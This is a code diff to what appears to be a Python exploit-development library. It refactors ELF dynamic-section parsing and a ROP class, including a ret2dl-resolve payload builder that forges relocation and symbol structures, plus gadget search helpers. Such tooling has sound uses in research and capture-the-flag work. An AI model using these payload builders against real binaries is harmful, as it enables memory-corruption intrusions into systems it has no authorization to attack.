@@ -45,6 +45,7 @@ class ELF:
                 self.wordsize = 4
             else:
                 raise Exception('unsupported format: %s' % field[3])
+        p.terminate()
 
         self._section = {}
         p = Popen(['objdump', '-h', fpath], stdout=PIPE)
@@ -54,6 +55,53 @@ class ELF:
                 continue
             name, addr = field[1], int(field[3], 16)
             self._section[name] = addr
+        p.terminate()
+
+        self._dynamic = {}
+        p = Popen(['objdump', '-p', fpath], stdout=PIPE)
+        line = ''
+        while line != 'Program Header:\n':
+            line = p.stdout.readline()
+        while line != 'Dynamic Section:\n':
+            line = p.stdout.readline()
+            field = line.split()
+            line = p.stdout.readline()
+            field.extend(line.split())
+            if len(field) != 15:
+                continue
+            name, offset, vaddr, filesz, flag = field[0], int(field[2], 16), int(field[4], 16), int(field[10], 16), field[14]
+            if name == 'RELRO':
+                self.sec['relro'] = True
+            elif name == 'STACK':
+                if not 'x' in flag:
+                    self.sec['nx'] = True
+            elif name == 'LOAD':
+                if not 'x' in flag:
+                    continue
+                with open(fpath, 'rb') as f:
+                    f.seek(offset)
+                    blob = f.read(filesz)
+                self.xmem = dict(offset=vaddr, blob=blob)
+        while line != '\n':
+            line = p.stdout.readline()
+            field = line.split()
+            if len(field) != 2:
+                continue
+            name, value = field[0], field[1]
+            if name == 'NEEDED':
+                ary = self._dynamic.setdefault(name, [])
+                ary.append(value)
+            else:
+                self._dynamic[name] = int(value, 16)
+                if name == 'BIND_NOW':
+                    self.sec['bind_now'] = True
+                elif name == 'RPATH':
+                    self.sec['rpath'] = True
+                elif name == 'RUNPATH':
+                    self.sec['runpath'] = True
+                elif name == 'DEBUG':
+                    self.sec['dt_debug'] = True
+        p.terminate()
 
         self._got = {}
         self._plt = {}
@@ -71,6 +119,7 @@ class ELF:
             if name == '__stack_chk_fail':
                 self.sec['stack_canary'] = True
             idx += 1
+        p.terminate()
 
         self._symbol = {}
         p = Popen(['objdump', '-T', fpath], stdout=PIPE)
@@ -80,43 +129,7 @@ class ELF:
                 continue
             name, addr = field[6], int(field[0], 16)
             self._symbol[name] = addr
-
-        p = Popen(['objdump', '-p', fpath], stdout=PIPE)
-        while True:
-            line = p.stdout.readline()
-            if not line:
-                break
-            field = line.split()
-            if len(field) > 0:
-                if field[0] == 'BIND_NOW':
-                    self.sec['bind_now'] = True
-                elif field[0] == 'RPATH':
-                    self.sec['rpath'] = True
-                elif field[0] == 'RUNPATH':
-                    self.sec['runpath'] = True
-                elif field[0] == 'DEBUG':
-                    self.sec['dt_debug'] = True
-            if len(field) != 9:
-                continue
-            if field[0] == 'RELRO':
-                self.sec['relro'] = True
-                p.stdout.readline()
-            elif field[0] == 'STACK':
-                line = p.stdout.readline()
-                field = line.split()
-                if not 'x' in field[5]:
-                    self.sec['nx'] = True
-            elif field[0] == 'LOAD':
-                vaddr, off = int(field[4], 16), int(field[2], 16)
-                line = p.stdout.readline()
-                field = line.split()
-                if not 'x' in field[5]:
-                    continue
-                filesz = int(field[1], 16)
-                with open(fpath, 'rb') as f:
-                    f.seek(off)
-                    blob = f.read(filesz)
-                self.xmem = dict(offset=vaddr, blob=blob)
+        p.terminate()
 
         self._string = {}
         p = Popen(['strings', '-tx', fpath], stdout=PIPE)
@@ -126,6 +139,7 @@ class ELF:
                 continue
             name, addr = field[1], int(field[0], 16)
             self._string[name] = addr
+        p.terminate()
 
     def p(self, x):
         if self.wordsize == 8:
@@ -133,7 +147,7 @@ class ELF:
         else:
             return p32(x)
 
-    def gadget(self, keyword, arg=1):
+    def gadget(self, keyword, pop_arg=1):
         regs = ['ax', 'cx', 'dx', 'bx', 'sp', 'bp', 'si', 'di']
 
         if keyword == 'ret':
@@ -141,16 +155,16 @@ class ELF:
         elif keyword == 'leave':
             return self.xmem['offset'] + self.xmem['blob'].index('\xc9\xc3')
         elif keyword == 'pop':
-            if isinstance(arg, int):
+            if isinstance(pop_arg, int):
                 # skip rsp
-                m = re.search(r"[\x58-\x5b\x5d-\x5f]{%d}\xc3" % arg, self.xmem['blob'])
+                m = re.search(r"[\x58-\x5b\x5d-\x5f]{%d}\xc3" % pop_arg, self.xmem['blob'])
                 return self.xmem['offset'] + m.start()
             else:
-                if len(arg) == 3 and arg[0] in ('r', 'e'):
-                    chunk = chr(0x58+regs.index(arg[1:])) + '\xc3'
+                if len(pop_arg) == 3 and pop_arg[0] in ('r', 'e'):
+                    chunk = chr(0x58+regs.index(pop_arg[1:])) + '\xc3'
                     return self.xmem['offset'] + self.xmem['blob'].index(chunk)
                 else:
-                    raise Exception("unexpected register: %r" % arg)
+                    raise Exception("unexpected register: %r" % pop_arg)
         elif keyword == 'pivot_eax':
             # xchg esp, eax
             return self.xmem['offset'] + self.xmem['blob'].index('\x94\xc3')
@@ -172,11 +186,20 @@ class ELF:
     def section(self, name):
         return self.base + self._section[name]
 
-    def got(self, name):
-        return self.base + self._got[name]
+    def dynamic(self, name):
+        return self.base + self._dynamic[name]
 
-    def plt(self, name):
-        return self.base + self._plt[name]
+    def got(self, name=None):
+        if name:
+            return self.base + self._got[name]
+        else:
+            return self.dynamic('PLTGOT')
+
+    def plt(self, name=None):
+        if name:
+            return self.base + self._plt[name]
+        else:
+            return self.base + self._section['.plt']
 
     def addr(self, name):
         return self.base + self._symbol[name]
@@ -287,48 +310,58 @@ class ROP(ELF):
         return self.call_chain(*ary)
 
     def dl_resolve(self, base, name, *args):
+        def align(x, origin=0, size=0):
+            pad = size - ((x-origin) % size)
+            return (x+pad, pad)
+
         if self.wordsize == 8:
+            jmprel = self.dynamic('JMPREL')
+            relaent = self.dynamic('RELAENT')
+            symtab = self.dynamic('SYMTAB')
+            syment = self.dynamic('SYMENT')
+            strtab = self.dynamic('STRTAB')
+
             # prerequisite:
             # 1) overwrite (link_map + 0x1c8) with NULL
             # 2) set registers for arguments
-            addr_reloc = base + self.wordsize*3
-            align_reloc = 0x18 - ((addr_reloc - self.section('.rela.plt')) % 0x18)
-            addr_reloc += align_reloc
-            addr_sym = addr_reloc + 0x18
-            align_dynsym = 0x18 - ((addr_sym - self.section('.dynsym')) % 0x18)
-            addr_sym += align_dynsym
-            addr_symstr = addr_sym + 0x18
+            addr_reloc, pad_reloc = align(base + self.wordsize*3, jmprel, relaent)
+            addr_sym, pad_sym = align(addr_reloc + 0x18, symtab, syment)
+            addr_symstr = addr_sym + syment
 
-            reloc_offset = (addr_reloc - self.section('.rela.plt')) / 0x18
-            r_info = (((addr_sym - self.section('.dynsym')) / 0x18) << 32) | 0x7
-            st_name = addr_symstr - self.section('.dynstr')
+            reloc_offset = (addr_reloc - jmprel) / relaent
+            r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
+            st_name = addr_symstr - strtab
 
-            buf = self.p(self.section('.plt'))
+            buf = self.p(self.plt())
             buf += self.p(reloc_offset)
             buf += self.junk()
-            buf += 'A' * align_reloc
+            buf += 'A' * pad_reloc
             buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
-            buf += 'A' * align_dynsym
+            buf += 'A' * pad_sym
             buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
             buf += self.string(name)
         else:
+            jmprel = self.dynamic('JMPREL')
+            relent = self.dynamic('RELENT')
+            symtab = self.dynamic('SYMTAB')
+            syment = self.dynamic('SYMENT')
+            strtab = self.dynamic('STRTAB')
+
             addr_reloc = base + self.wordsize*(3+len(args))
-            addr_sym = addr_reloc + 0x8
-            align_dynsym = 0x10 - ((addr_sym - self.section('.dynsym')) % 0x10)
-            addr_sym += align_dynsym
-            addr_symstr = addr_sym + 0x10
+            addr_sym, pad_sym = align(addr_reloc+relent, symtab, syment)
+            addr_symstr = addr_sym + syment
 
-            reloc_offset = addr_reloc - self.section('.rel.plt')
-            r_info = (((addr_sym - self.section('.dynsym')) / 0x10) << 8) | 0x7
-            st_name = addr_symstr - self.section('.dynstr')
+            reloc_offset = addr_reloc - jmprel
+            r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
+            st_name = addr_symstr - strtab
 
-            buf = self.p(self.section('.plt'))
+            buf = self.p(self.plt())
             buf += self.p(reloc_offset)
             buf += self.junk()
             for arg in args:
                 buf += self.p(arg)
             buf += struct.pack('<II', self.section('.bss'), r_info)  # Elf32_Rel
-            buf += 'A' * align_dynsym
+            buf += 'A' * pad_sym
             buf += struct.pack('<IIII', st_name, 0, 0, 0x12)         # Elf32_Sym
             buf += self.string(name)
 
